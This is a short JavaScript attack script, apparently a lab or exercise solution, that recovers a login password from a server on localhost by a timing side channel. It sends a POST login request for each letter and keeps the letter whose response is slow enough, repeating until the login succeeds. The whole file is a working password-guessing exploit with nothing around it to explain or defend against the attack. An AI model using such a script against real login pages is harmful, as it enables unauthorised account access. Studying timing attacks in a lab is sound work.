var fetch = require('cross-fetch');


// login function
function tryLogin(password) {
    
    // send post login request
    return fetch('http://localhost:7681/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', },
        body: `password=${password}`,
    });
}


// alphabet variable
let alphabet = 'abcdefghijklmnopqrstuvwxyz';

// correct letter will append to this variable
// let password = 'schelling';
let password = '';


// hack password by checking latency of alphabet
async function hackPassword() {
    
    // response defined outside of the loop
    let resp;

    for (let letter of alphabet) {

        // calculate time elapsed
        let startTime = new Date().getTime();
        resp = await tryLogin(password.concat(letter));
        let reqTime = new Date().getTime() - startTime;

        // display time elapsed
        console.log(letter + ` ${reqTime} milliseconds`);
        
        // if the time elapsed > 50ms * count of password it is the correct letter, append it to the password
        if (reqTime > 50 * (password.length + 1)) {  // password initial length is zero
            
            // append this char to the password string
            password = password.concat(letter);

            // if creack, break out of loop
            if (resp.ok == true) break;
            
            
            break;
        }
    }
    
    // if login is successful break
    if (resp.ok != true) {
        // start the function again if login failed
        hackPassword();
    }

    // log stats
    console.log(`login success: ${resp.ok}`);
    console.log("password is: " + password);
}

hackPassword();
